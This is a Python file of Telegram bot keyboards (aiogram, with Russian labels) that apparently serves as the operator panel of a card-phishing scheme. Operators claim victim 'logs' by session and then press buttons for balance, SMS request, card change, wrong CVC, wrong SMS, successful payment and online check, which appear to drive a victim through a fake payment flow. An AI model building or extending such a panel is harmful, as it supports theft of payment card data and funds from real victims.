from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import config

def get_take_log_keyboard(session_id: str):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Взять лог", callback_data=f"take:{session_id}")]
    ])

def get_taken_keyboard(username: str, user_id: int, session_id: str):
    """
    Клавиатура для занятого лога.
    Админы видят кнопку 'Забрать у пользователя'
    """
    buttons = [[InlineKeyboardButton(text=f"Лог взял @{username}", callback_data="already_taken")]]
    
    # Добавляем кнопку для админов
    # Проверяем, что это НЕ админ взял лог (админам не нужна кнопка забрать у самих себя)
    if user_id not in config.ADMIN_IDS:
        buttons.append([InlineKeyboardButton(
            text="👮‍♂️ Забрать у пользователя (Админ)", 
            callback_data=f"admin_take:{session_id}"
        )])
    
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def get_management_keyboard(session_id: str):
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="💰 Баланс", callback_data=f"balance:{session_id}"),
            InlineKeyboardButton(text="📞 SMS", callback_data=f"sms:{session_id}")
        ],
        [
            InlineKeyboardButton(text="🔄 Изменить карту", callback_data=f"change:{session_id}"),
            InlineKeyboardButton(text="❌ Ошибка CVC", callback_data=f"wrong_cvc:{session_id}")
        ],
        [
            InlineKeyboardButton(text="✅ Успешная оплата", callback_data=f"success:{session_id}"),
            InlineKeyboardButton(text="❌ Ошибка SMS", callback_data=f"wrong_sms:{session_id}")
        ],
        [
            InlineKeyboardButton(text="🔍 Проверить онлайн", callback_data=f"check_online:{session_id}")
        ]
    ])

def get_revoked_keyboard():
    """Клавиатура для сообщения об отозванном логе"""
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌ Лог отозван администратором", callback_data="revoked")]
    ])